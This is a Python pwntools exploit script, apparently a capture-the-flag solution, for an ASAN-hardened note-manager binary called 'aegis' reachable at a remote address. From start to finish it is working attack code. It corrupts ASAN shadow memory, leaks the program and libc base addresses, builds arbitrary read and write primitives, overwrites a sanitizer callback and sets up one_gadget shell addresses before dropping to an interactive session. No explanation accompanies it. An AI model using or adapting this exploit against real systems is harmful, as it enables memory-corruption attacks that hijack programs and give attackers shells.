#!/usr/bin/python
from pwn import *
context.binary = "./aegis"
context.arch = "amd64"
context.os = "linux"
# context.log_level='debug'
context.terminal  = ["tmux", "sp", "-h"]

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote('111.186.63.209', 6666)
    # p = remote('localhost', 6666)
else:
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        p = gdb.debug("./aegis", gdbscript='''
              b *(0x555555554000 + 0x1145f0)
              ''')
    else:
        p = process("./aegis")
#p = process("./aegis")
#    b *(0x555555554000 + 0x114250)
          #    b *(0x555555554000 + 0x1145f0)
          #    b *(0x555555554000 + 0x1147e0)
          #    ''')
              # b *(0x555555554000 + 0x1146d6)
              # b *(0x555555554000 + 0x1146ec)
              # b *(0x555555554000 + 0x114357)
              # add_note b *(0x555555554000 + 0x114250)
              # update_note b *(0x555555554000 + 0x1145f0)
              # delete               b *(0x555555554000 + 0x1147e0)

def add_note(size, content, ID):
    p.recvuntil("Choice: ")
    p.sendline("1")
    print(p.recv())
    p.sendline("{}".format(size))
    print(p.recv())
    p.send("{}".format(content))
    print(p.recv())
    p.sendline("{}".format(ID))

def show_note(index):
    p.recvuntil("Choice: ")
    p.sendline("2")
    print(p.recvuntil("Index: "))
    p.sendline("{}".format(index))
    p.recvuntil("Content: ")
    return p.recvline()

def update_note_sendline(index, new_content, new_ID):
    p.recvuntil("Choice: ")
    p.sendline("3")
    print(p.recv())
    p.sendline("{}".format(index))
    print(p.recv())
    p.sendline("{}".format(new_content))
    print(p.recv())
    p.sendline("{}".format(new_ID))

def update_note(index, new_content, new_ID):
    p.recvuntil("Choice: ")
    p.sendline("3")
    print(p.recv())
    p.sendline("{}".format(index))
    print(p.recv())
    p.send("{}".format(new_content))
    # print(p.recv())
    p.sendline("{}".format(new_ID))

def delete_note(index):
    p.recvuntil("Choice: ")
    p.sendline("4")
    print(p.recv())
    p.sendline("{}".format(index))

def secret(addr):
    p.recvuntil("Choice: ")
    p.sendline("666")
    print(p.recv())
    p.sendline("{}".format(addr))

def exit():
    p.recvuntil("Choice: ")
    p.sendline("5")


def to_asan(addr):
    return ((addr >> 3) + 0x7fff8000)

def leak_word():
    note_data = show_note(0)
    print "note data", note_data
    note_data = note_data.split('\n')[0]
    note_data = (u64(note_data.ljust(8, '\x00')))
    return note_data

VAL = 0xffffffffffffffff
# add_note(128, "a"*120, VAL)
# add_note(128, "b"*120, VAL)
# secret(0x0c187fff8018)
# update_note(0, "c"*(133), VAL)
# delete_note(1)
# add_note(128, "D"*120, VAL)p # update_note(0, "c"*(133), VAL)

# add_note(24, "a"*16, VAL)
# add_note(24, "b"*16, VAL)
add_note(16, "a"*8, VAL)
add_note(16, "b"*8, VAL)

addr = to_asan(0x602000000020)
print "magiccc", hex(addr)
secret(addr)

# do 1st update
update_note(0, 'C'*18, 0xffff)

# do 2nd update
payload  = 'd'*16 + '\x02'*3
payloadid = 0xffffffff02ffffff
update_note_sendline(0, payload, payloadid)

#POINTER at 0x602000000030
#TEXT AT 0x555555668ab0
delete_note(0)
add_note(16, p64(0x602000000018), 0x00)
note_data = leak_word()
cfi = note_data
text_base = note_data - 1133232
log.progress("Text base: {}".format((hex(text_base))))

got_offset = 0x000000000347E28

def arb_read(addr):
    update_note(2, "c"*(1)+"\n", VAL)
    update_note(2, "c"*(2), 0xffff)
    update_note(2, "c"*(4), 0xffff)
    update_note(2, "c"*(6), 0xffff)
    update_note(2, "c"*(8), 0xffff)
    update_note(2, p64(addr)[0:7] + "\n", cfi)

    note_data = leak_word()
    return note_data

libc = arb_read(got_offset + text_base)

libc -= 526784
log.progress("LIBC: {}".format(hex(libc)))
# all three one_gadgets in libc
one_gadget = libc + 0x4f2c5
# one_gadget = libc + 0x4f322
# one_gadget = libc + 0x10a38c
log.progress("ONE GADGET: {}".format(hex(one_gadget)))

malloc_hook_offset = 0x00000000003ebc30
main_arena_offset = 4111424
asan_malloc_hook_offset = 0x7ae140
san_userdie_callback = 0xFB0888
strtoul_got_offset = 0x347f20
environ_offset = 4120728
sleep_offset = 0x1b680

# intercepted methods
real_vprintf_off = 0x55BBB0
real_memset_off = 0x55Bd30
real_cxa_atexit = 0x559208

# text methods
update_func = text_base + 0x114614
main_func = text_base + 0x114990
# secret_write = text_base + 0x11491c

# reset pointer again
# stack = arb_read(libc+environ_offset)
# # arb_read(text_base + asan_malloc_hook_offset)

# log.progress("stack: {}".format(hex(stack)))
# retaddr = stack - 0x150
# log.progress("retaddr: {}".format(hex(retaddr)))
# overwrite_addr = retaddr

# perform overwrite!
overwrite_addr = text_base + san_userdie_callback + 0x20

def arb_write(addr, val, idval = 0, use_cfi = True):
    update_note(2, "c"*(1)+"\n", VAL)
    update_note(2, "c"*(2), 0xffff)
    update_note(2, "c"*(4), 0xffff)
    update_note(2, "c"*(6), 0xffff)
    update_note(2, "c"*(8), 0xffff)
    mycfi = cfi if use_cfi else VAL
    update_note(2, p64(addr)[0:7] + "\n", mycfi)

    print "idval", idval
    update_note(0, p64(val), idval )

def update_trunc(index, new_content, new_ID):
    p.sendline("{}".format(index))
    print(p.recv())
    p.send("{}".format(new_content))
    # print(p.recv())
    p.sendline("{}".format(new_ID))


arb_write(overwrite_addr, text_base + sleep_offset, use_cfi = False)
# arb_write(overwrite_addr, main_func)
# p.sendline("{}".format(0x41414141))
# update_trunc(0, one_gadget, 0)

# arb_write(overwrite_addr, one_gadget)
p.interactive()


